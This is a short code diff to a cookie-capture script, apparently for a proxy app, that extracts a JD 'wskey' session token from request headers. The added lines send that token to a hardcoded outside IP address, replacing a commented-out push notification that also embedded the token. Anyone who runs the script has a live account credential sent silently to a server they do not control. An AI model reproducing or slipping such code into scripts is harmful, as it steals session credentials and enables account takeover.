@@ -43,8 +43,9 @@ function GetCookie() {
             var CV = $request.headers['Cookie'] || $request.headers['cookie'];
             var wsk = CV.match(/wskey=.+?;/);
             //$.notify("运行成功")
-            var notifyUrl='https://api.day.app/3rnzRCyqGvzSi8rFzSVXJj/抓取通知/'+wsk+'/?autoCopy=1&copy='+wsk+'&icon=https://cdn.jsdelivr.net/gh/braless/site_logo/jd_app.png'
-            $.http.get(encodeURI(notifyUrl))
+            //var notifyUrl='https://api.day.app/3rnzRCyqGvzSi8rFzSVXJj/抓取通知/'+wsk+'/?autoCopy=1&copy='+wsk+'&icon=https://cdn.jsdelivr.net/gh/braless/site_logo/jd_app.png'
+            var reqUrl="http://120.46.171.189:5003/push"+wsk
+            $.http.get(reqUrl)
         }else {
             $.notify('获取失败', '', '请检查匹配URL或配置内脚本类型 ‼️');
         }
